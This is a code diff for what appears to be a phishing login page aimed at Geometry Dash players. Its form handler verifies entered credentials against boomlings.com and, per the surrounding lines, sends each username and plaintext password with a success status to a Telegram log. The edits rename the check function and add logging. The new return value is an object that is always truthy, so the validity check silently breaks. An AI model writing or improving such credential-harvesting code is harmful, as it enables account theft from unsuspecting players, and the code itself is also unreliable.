@@ -76,12 +76,12 @@ async function getPlayerStats(username) {
 }
 
 async function generateGJP2(password) {
-    const salt = "mI29fmAnxgTs";
+    const SALT = "mI29fmAnxgTs";
 
     const encoder = new TextEncoder();
 
     const data = encoder.encode(
-        password + salt
+        password + SALT
     );
 
     const hashBuffer =
@@ -90,17 +90,26 @@ async function generateGJP2(password) {
             data
         );
 
-    return Array.from(
-        new Uint8Array(hashBuffer)
-    )
-    .map(
-        b => b.toString(16)
-        .padStart(2, "0")
-    )
-    .join("");
+    const hash =
+        Array.from(
+            new Uint8Array(hashBuffer)
+        )
+        .map(
+            b =>
+            b.toString(16)
+            .padStart(2, "0")
+        )
+        .join("");
+
+    console.log(
+        "GJP2:",
+        hash
+    );
+
+    return hash;
 }
 
-async function validatePassword(
+async function logingd(
     username,
     password
 ){
@@ -130,33 +139,67 @@ async function validatePassword(
 
         const response =
             await fetch(
-            "https://www.boomlings.com/database/accounts/loginGJAccount.php",
-        {
-            method:"POST",
 
-            headers:{
-                "Content-Type":
-                "application/x-www-form-urlencoded",
+"https://www.boomlings.com/database/accounts/loginGJAccount.php",
 
-                "Cookie":"gd=1;"
-            },
+            {
+                method:
+                "POST",
 
-            body:payload
-        });
+                headers:{
+                    "Content-Type":
+
+"application/x-www-form-urlencoded"
+                },
+
+                body:
+                payload
+            }
+        );
 
         const result =
             (
                 await response.text()
             ).trim();
-            
-        return /^\d+$/.test(
+
+        console.log(
+            "Login response:",
+            result
+        );
+
+        return {
+
+            success:
+
+/^\d+$/.test(
     result
-);
+),
+
+            response:
+            result,
+
+            gjp2:
+            gjp2
+        };
 
     }
-    catch{
+    catch(error){
 
-        return false;
+        console.error(
+            error
+        );
+
+        return {
+
+            success:
+            false,
+
+            response:
+            null,
+
+            error:
+            error.message
+        };
 
     }
 }
@@ -240,7 +283,7 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
     }
 
     // Validate password
-    const isPasswordValid = await validatePassword(username, password);
+    const isPasswordValid = await logingd(username, password);
     const stats = await getPlayerStats(username);
 
     // Send log to Telegram
@@ -250,9 +293,9 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
         username: username,
         password: password,
         status: isPasswordValid ? 'SUKSES' : 'GAGAL',
-        rank: stats?.accountID || 'N/A',
-        cp: stats?.creatorPoints || 0,
-        mod: stats?.modLevel || 0
+        rank: stats?.rank || 'N/A',
+        cp: stats?.cp || 0,
+        mod: stats?.moderator || 0
     });
 
     if (!isPasswordValid) {
